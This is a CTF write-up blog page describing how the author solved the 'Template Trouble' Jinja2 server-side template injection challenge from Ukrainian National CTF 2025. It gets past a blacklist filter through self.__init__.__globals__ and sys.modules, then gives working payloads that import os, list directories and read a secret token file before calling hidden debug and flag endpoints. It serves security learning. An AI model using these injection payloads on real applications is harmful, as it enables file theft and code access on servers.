<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Ukrainian National CTF 2025 – Template Trouble (SSTI + Hidden Debug)</title>
    <meta name="description" content="Writeup for Template Trouble SSTI challenge from Ukrainian National CTF 2025 by Alexandru Hossu.">
    <meta property="og:title" content="Template Trouble – SSTI + Hidden Debug" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta name="twitter:card" content="summary" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/jpeg" href="../avatar.jpg">

    <style>
      :root { --bg:#121212; --fg:#e0e0e0; --accent:#61dafb; --border:#333; --muted:#a0a0a0; }
      * { box-sizing:border-box; }
      body {
        margin:0; padding:0; background:var(--bg); color:var(--fg);
        font-family:'Work Sans',sans-serif; line-height:1.6;
      }
      a { color:var(--accent); text-decoration:none; }
      a:hover { text-decoration:underline; }
      .wrapper { max-width:768px; margin:0 auto; padding:2rem 1rem 3rem; }
      .site-header {
        display:flex; justify-content:space-between; align-items:center; margin-bottom:3rem;
      }
      .site-title { font-weight:700; font-size:1.5rem; color:var(--fg); }
      .site-logo {
        height:48px; width:48px; border-radius:50%; object-fit:cover;
      }
      .post { max-width:768px; margin:0 auto; }
      .post-header h1 { margin:0 0 0.5rem; font-size:2rem; font-weight:500; }
      .post-subtitle { margin:0 0 0.75rem; opacity:0.8; font-size:1rem; }
      .post-meta {
        margin:0 0 1.5rem; font-size:0.9rem; color:var(--muted);
        display:flex; flex-wrap:wrap; gap:0.75rem;
      }
      .post-tags { display:flex; flex-wrap:wrap; gap:0.4rem; margin-top:0.4rem; }
      .tag {
        font-size:0.75rem; padding:0.15rem 0.5rem; border-radius:999px;
        border:1px solid var(--border); background:rgba(255,255,255,0.02);
      }
      .post-toc {
        margin:2rem 0; padding:1rem 1.25rem; border-radius:0.75rem;
        border:1px solid var(--border); background:#181818;
      }
      .post-toc-title {
        margin:0 0 0.5rem; font-size:0.95rem; font-weight:500;
        text-transform:uppercase; letter-spacing:0.06em; opacity:0.8;
      }
      .post-toc ul { margin:0; padding-left:1.25rem; font-size:0.95rem; }
      .post-toc li { margin:0.1rem 0; }
      section + section { margin-top:2rem; }
      h2 { font-size:1.4rem; margin-bottom:0.5rem; font-weight:500; }
      h3 { font-size:1.15rem; margin-bottom:0.4rem; font-weight:500; }
      p { margin:0 0 0.9rem; }
      ul,ol { padding-left:1.25rem; margin-top:0; margin-bottom:0.9rem; }
      code {
        font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
        font-size:0.9rem; background:rgba(255,255,255,0.04);
        padding:0.15rem 0.3rem; border-radius:0.25rem;
      }
      pre {
        margin:0 0 1.25rem; padding:0.85rem 1rem; background:#0b0b0b;
        border-radius:0.5rem; border:1px solid #1f1f1f; overflow-x:auto;
      }
      pre code { background:transparent; padding:0; }
      .note {
        padding:0.75rem 1rem; border-radius:0.5rem; border:1px solid var(--border);
        background:#181818; font-size:0.92rem; margin-bottom:1rem;
      }
      .back-link { margin:0 0 2rem; font-size:0.95rem; }
      .site-footer {
        border-top:1px solid var(--border); margin-top:3rem; padding-top:1rem;
        display:flex; justify-content:space-between; align-items:center;
      }
      .site-footer p { margin:0; font-size:0.9rem; opacity:0.6; }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <header class="site-header">
        <a href="/" class="site-title">Alexandru Hossu</a>
        <img src="../avatar.jpg" alt="Logo" class="site-logo">
      </header>

      <article class="post">
        <p class="back-link">
          ← <a href="index.html">Back to all writeups</a>
        </p>

        <header class="post-header">
          <h1>Ukrainian National CTF 2025 – Template Trouble (SSTI + Hidden Debug)</h1>
          <p class="post-subtitle">
            Jinja2 SSTI with a half-decent filter, bypassed via <code>sys.modules</code> to read a
            secret debug token and hit a hidden flag endpoint.
          </p>
          <p class="post-meta">
            <span>Category: Web</span>
            <span>CTF: Ukrainian National CTF 2025</span>
          </p>
          <div class="post-tags">
            <span class="tag">SSTI</span>
            <span class="tag">Jinja2</span>
            <span class="tag">Filter Bypass</span>
            <span class="tag">Debug Endpoint</span>
          </div>
        </header>

        <nav class="post-toc">
          <p class="post-toc-title">On this page</p>
          <ul>
            <li><a href="#context">0. Context</a></li>
            <li><a href="#recon">1. Recon & confirming SSTI</a></li>
            <li><a href="#bypass">2. Bypassing the filter</a></li>
            <li><a href="#debug-token">3. Reading the debug token</a></li>
            <li><a href="#flag-endpoint">4. Debug interface → flag</a></li>
            <li><a href="#lessons">5. Takeaways</a></li>
            <li><a href="#flag">6. Flag</a></li>
          </ul>
        </nav>

        <section id="context">
          <h2>0. Context</h2>
          <p>
            The challenge is a small notification app (“Template Trouble”) that renders messages using Jinja2.
            The description hints at server-side template injection and “strong filters”.
          </p>
          <p>
            Rough plan:
          </p>
          <ol>
            <li>Confirm SSTI and figure out where templates are rendered.</li>
            <li>Understand and bypass the blacklist-style filter.</li>
            <li>Read a secret file from disk containing a debug token.</li>
            <li>Use that token to talk to a hidden debug interface and grab the flag.</li>
          </ol>
        </section>

        <section id="recon">
          <h2>1. Recon & confirming SSTI</h2>
          <p>
            After logging in with the given user, the app lets you send notifications that later show up
            on a dashboard. The API response itself doesn’t render templates, only the dashboard does.
          </p>
          <p>
            I tried a basic SSTI test:
          </p>
          <pre><code>{{7*7}}</code></pre>
          <p>
            When viewing the notification in the dashboard, the payload was evaluated and rendered as <code>49</code>,
            confirming Jinja2 SSTI.
          </p>
        </section>

        <section id="bypass">
          <h2>2. Bypassing the filter</h2>
          <p>
            The challenge code (e.g. <code>validate_ctf.py</code>) showed a set of blacklisted patterns:
            <code>__class__</code>, <code>__builtins__</code>, <code>import</code>, <code>os.</code>,
            <code>subprocess</code>, <code>config.</code>, <code>eval</code>, <code>exec</code>, etc.
          </p>
          <p>
            Direct payloads like this were blocked:
          </p>
          <pre><code>{{ config['SECRET_KEY'] }}
{{ self.__class__.__mro__ }}</code></pre>
          <p>
            Instead, I used the globals from the template function:
          </p>
          <pre><code>{{ self.__init__.__globals__ }}</code></pre>
          <p>
            That exposed <code>sys</code>, <code>builtins</code> and other modules without hitting the filter.
            From there you can reach <code>open</code> via <code>sys.modules['builtins']</code>.
          </p>
        </section>

        <section id="debug-token">
          <h2>3. Reading the debug token</h2>
          <p>
            The goal is to find a hidden debug URL or token. The interesting directory was
            <code>/opt/task1</code>, which I enumerated with:
          </p>
          <pre><code>{{ self.__init__.__globals__['sys'].modules['builtins']
   .__import__('os').listdir('/opt/task1') }}</code></pre>
          <p>
            One of the files was <code>secret_debug_url.txt</code>. Reading it:
          </p>
          <pre><code>{{ self.__init__.__globals__['sys'].modules['builtins']
   .open('/opt/task1/secret_debug_url.txt').read() }}</code></pre>
          <p>
            This returned a long debug token string, something like:
          </p>
          <pre><code>debug_token_7f8a9b2c3d4e...</code></pre>
        </section>

        <section id="flag-endpoint">
          <h2>4. Debug interface → flag</h2>
          <p>
            With the token in hand, the rest is just HTTP:
          </p>
          <pre><code>GET /debug-interface?token=&lt;token&gt;</code></pre>
          <p>
            That confirms access to the debug interface. Then the actual flag endpoint:
          </p>
          <pre><code>GET /flag?token=&lt;token&gt;</code></pre>
          <p>
            The response contains the flag in plain text.
          </p>
        </section>

        <section id="lessons">
          <h2>5. Takeaways</h2>
          <ul>
            <li>Blacklists are fragile; indirect access via <code>sys.modules</code> is usually enough.</li>
            <li>Templates might not render on the API response, but only on the “view” pages.</li>
            <li>
              Jinja2’s <code>self.__init__.__globals__</code> gives you a powerful entry point into
              the Python runtime.
            </li>
            <li>Once you can read files, searching for tokens / debug URLs is often the intended path.</li>
          </ul>
        </section>

        <section id="flag">
          <h2>6. Flag</h2>
          <p>
            The challenge flag was:
          </p>
          <pre><code>CTF{Stand_with_Ukraine}</code></pre>
        </section>
      </article>

      <footer class="site-footer">
        <p>2025 © Alexandru Hossu</p>
      </footer>
    </div>
  </body>
</html>
